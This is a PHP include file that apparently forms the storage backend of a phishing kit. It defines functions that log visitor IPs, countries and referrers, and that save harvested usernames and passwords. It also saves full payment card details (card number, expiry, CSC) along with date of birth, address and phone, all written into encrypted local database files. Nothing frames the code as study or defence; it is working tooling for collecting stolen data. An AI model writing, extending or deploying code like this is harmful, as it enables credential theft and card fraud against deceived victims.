<?php
session_start();

if(INC != "true") {
  exit();
}

function savevisitor($type, $stage) {
  if($type == "visitor") {
    date_default_timezone_set('UTC');
    $visitorsdb = new CryptoDB("track/db/visitors.cryptodb");
    $visitor_ip = $_SESSION['_ip_'];
    $visitor_country = $_SESSION['country_code'];
    $visitor_referer = $_SERVER["HTTP_REFERER"];
    $datetime = date("F j, Y, g:i a");;
    $stage = htmlentities($stage);
    $current_row = $visitorsdb->totalRows("visitors")+1;
    $visitorsdb->insertRow("visitors", '[ROW id="'.$current_row.'"][COLUMN name="country"]'.$visitor_country.'[/COLUMN][COLUMN name="ip"]'.$visitor_ip.'[/COLUMN][COLUMN name="referrer"]'.$visitor_referer.'[/COLUMN][COLUMN name="datetime"]'.$datetime.'[/COLUMN][COLUMN name="stage"]'.$stage.'[/COLUMN][/ROW]');
  }
}
function savelogin($username, $passwords, $incpass) {
  $accountsdb = new CryptoDB("../track/db/accounts.cryptodb", $incpass);
  $current_row = $accountsdb->totalRows("accounts")+1;
  $accountsdb->insertRow("accounts", '[ROW id="'.$current_row.'"][COLUMN name="username"]'.htmlentities($username).'[/COLUMN][COLUMN name="password"]'.htmlentities($passwords).'[/COLUMN][/ROW]');
}
function saveCredit($dob, $fname, $lname, $country, $state, $zip, $phonet, $phonen, $cardnumber, $exp, $csc, $incpass) {
  $creditsdb = new CryptoDB("../track/db/credit.cryptodb", $incpass);
  $current_row = $creditsdb->totalRows("credits")+1;
  $creditsdb->insertRow("credits", '[ROW id="1"][COLUMN name="fname"]'.$fname.'[/COLUMN][COLUMN name="lname"]'.$lname.'[/COLUMN][COLUMN name="country"]'.$country.'[/COLUMN][COLUMN name="state"]'.$state.'[/COLUMN][COLUMN name="zip"]'.$zip.'[/COLUMN][COLUMN name="numberp"]'.$phonen.'[/COLUMN][COLUMN name="typep"]'.$phonet.'[/COLUMN][COLUMN name="dob"]'.$dob.'[/COLUMN][COLUMN name="cardnumber"]'.$cardnumber.'[/COLUMN][COLUMN name="exp"]'.$exp.'[/COLUMN][COLUMN name="csc"]'.$csc.'[/COLUMN][/ROW]');
}
?>
